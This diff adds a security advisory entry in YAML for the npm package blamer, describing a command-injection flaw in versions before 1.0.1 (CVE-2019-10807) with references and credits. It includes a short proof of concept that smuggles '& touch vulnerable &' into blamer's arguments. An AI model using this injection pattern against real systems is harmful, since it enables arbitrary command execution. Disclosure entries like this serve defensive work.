@@ -1,0 +1,40 @@
+---
+- id: snykio:npm:blamer:559541
+  title: Command Injection
+  description: |
+    [blamer][1] is a tool for get information about author of code from
+    version control system. Supports git and subversion.
+
+    Affected versions of this package are vulnerable to Command Injection.
+    It is possible to inject arbitrary commands as part of the arguments
+    provided to blamer.
+
+    ### PoC   {#poc}
+
+        var Root = require("blamer");
+        var attack_command = "& touch vulnerable &";
+        root = new Root('git',attack_command);
+        root.blameByFile("./");
+
+
+
+    [1]: https://www.npmjs.com/package/blamer
+  affected_package: blamer
+  vulnerable_versions:
+  - "<1.0.1"
+  severity: medium
+  package_manager: npm
+  cve:
+  - CVE-2019-10807
+  cwe:
+  - CWE-78
+  disclosed_date: 2020-03-09
+  created_date: 2020-03-09
+  last_modified_date: 2020-03-09
+  credit:
+  - JHU System Security Lab
+  - mik317
+  references:
+  - https://github.com/kucherenko/blamer/commit/5fada8c9b6986ecd28942b724fa682e77ce1e11c
+  - https://hackerone.com/reports/772448
+  source_url: https://snyk.io/vuln/SNYK-JS-BLAMER-559541
